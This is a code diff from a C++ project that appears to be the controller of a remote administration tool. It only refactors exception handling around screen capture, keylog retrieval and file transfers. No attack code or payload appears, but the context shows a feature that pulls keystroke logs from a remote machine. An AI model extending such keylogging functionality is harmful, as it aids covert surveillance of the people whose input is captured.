@@ -249,17 +249,12 @@ namespace Master
 			}
 			LOG << "Image format : " + toString(screen.width()) + "x" + toString(screen.height());
 		}
-        catch(FileNotFound& e)
-        {
-            LOG << e.what();
-            emit disconnected();
-        }
-        catch(ReadingError& e)
-        {
-            LOG << e.what();
-            emit disconnected();
-        }
 		catch(Network::Deconnection& e)
+        {
+            LOG << e.what();
+            emit disconnected();
+        }
+        catch(TransferException& e)
         {
             LOG << e.what();
             emit disconnected();
@@ -441,17 +436,9 @@ namespace Master
             current_keylog.clear();
             current_keylog.append(keylog_buffer.c_str());
         }
-        catch(RemoteFileNotFound&)
+        catch(TransferException& e)
         {
-            LOG << "Unable to find remote file";
-        }
-        catch(LocalFileNotFound&)
-        {
-            LOG << "Can't write local file";
-        }
-        catch(FileNotFound&)
-        {
-            LOG << "File does not exist";
+            LOG << e.what();
         }
         catch(exception& e)
         {
@@ -600,12 +587,7 @@ namespace Master
             transfer.addObserver(new GraphicProgressBar(bar));
             transfer.launch();
         }
-        catch(Blaspheme::FileNotFound&)
-        {
-            LOG << "Unable to create destination file : "+destination.toStdString();
-            emit disconnected();
-        }
-        catch(exception& e)
+        catch(std::exception& e)
         {
             LOG << e.what();
             emit disconnected();
@@ -629,11 +611,7 @@ namespace Master
             transfer.addObserver(new GraphicProgressBar(bar));
             transfer.launch();
 		}
-        catch(Blaspheme::FileNotFound&)
-        {
-            LOG << "Unable to create destination file : " + destination.toStdString();
-        }
-        catch(exception& e)
+        catch(std::exception& e)
         {
             LOG << e.what();
             emit disconnected();
